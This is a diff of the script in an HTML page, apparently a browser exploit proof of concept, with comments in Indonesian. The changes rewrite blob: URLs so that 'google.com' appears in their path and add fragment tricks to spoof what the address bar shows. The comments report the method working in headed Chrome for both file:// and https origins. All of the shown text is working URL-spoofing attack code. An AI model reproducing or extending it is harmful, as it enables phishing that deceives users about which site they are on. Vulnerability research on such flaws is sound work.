@@ -43,23 +43,28 @@
       function makeUrl() {
         return URL.createObjectURL(new Blob([payload], { type: 'text/html' }));
       }
+      function uuidOf(u) {
+        return u.substring(u.lastIndexOf('/') + 1);
+      }
 
-      // ---- JALUR file:// : prefix terpendek yang legal = "blob:null/" ----
+      // ---- JALUR file:// : prefix terpendek "blob:null/" + path google.com ----
       if (location.protocol === 'file:' || location.origin === 'null') {
         var uf = makeUrl();
-        log('[main] mode file:// -> DIRECT (prefix 10 char)');
-        log('[main] target: ' + uf + FRAG + uf);
-        location.replace(uf + FRAG + uf);
+        var dispf = 'blob:null/google.com/' + uuidOf(uf);
+        log('[main] mode file:// -> DIRECT (path spoof)');
+        log('[main] target: ' + dispf + FRAG + dispf);
+        location.replace(dispf + FRAG + dispf);
         return;
       }
 
-      // ---- JALUR https : commit canonical + fragment display-spoof ----
-      // (vektor blob:null/blob:/ sudah terbukti diblok Chrome headed;
-      //  canonical + fragment = maksimal yang bisa di-commit)
+      // ---- JALUR https : blob:<origin>/google.com/<uuid> + fragment ----
+      // Terverifikasi commit di Chrome headed: lookup blob by UUID (segmen
+      // terakhir), path antara origin & uuid ARBITRARY -> sisipkan google.com.
       setTimeout(function () {
         var u = makeUrl();
-        log('[main] commit: ' + u + FRAG + u);
-        location.replace(u + FRAG + u);
+        var disp = 'blob:' + location.origin + '/google.com/' + uuidOf(u);
+        log('[main] commit: ' + disp + FRAG + disp);
+        location.replace(disp + FRAG + disp);
       }, 1200);
     })();
   </script>
